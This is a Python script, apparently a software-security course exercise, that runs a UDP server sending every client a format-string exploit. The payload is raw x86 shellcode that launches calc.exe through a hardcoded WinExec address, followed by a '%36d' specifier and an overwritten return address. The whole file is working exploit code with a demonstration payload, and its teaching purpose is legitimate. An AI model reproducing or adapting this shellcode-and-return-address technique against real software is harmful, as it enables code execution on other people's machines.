#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
''' 软件安全与漏洞分析第十三周任务, 目的是演示格式化输出函数漏洞以及整数溢出漏洞
'''
__author__ = '__L1n__w@tch'

import socketserver

buf = b"\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8D\x04\x24\x50\xB9\xC7\x93\xBF\x77\xFF\xD1"
shellcode = buf


class MyUDPHandler(socketserver.BaseRequestHandler):
    """
    This class works similar to the TCP handler class, except that
    self.request consists of a pair of data and client socket, and since
    there is no connection the client address must be given explicitly
    when sending data back via sendto().
    """

    def handle(self):
        data = self.request[0].strip()
        socket = self.request[1]
        print("{} wrote:".format(self.client_address[0]))
        print(data)
        # socket.sendto(data.upper(), self.client_address)

        exploit_format_vul = b"%36d"
        exploit_retn_address = b"\x00\x12\xFC\xCC"[::-1]
        exploit = shellcode + exploit_format_vul + exploit_retn_address
        socket.sendto(exploit, self.client_address)


def main():
    HOST, PORT = "192.168.117.1", 9999
    server = socketserver.UDPServer((HOST, PORT), MyUDPHandler)
    server.serve_forever()


if __name__ == "__main__":
    main()
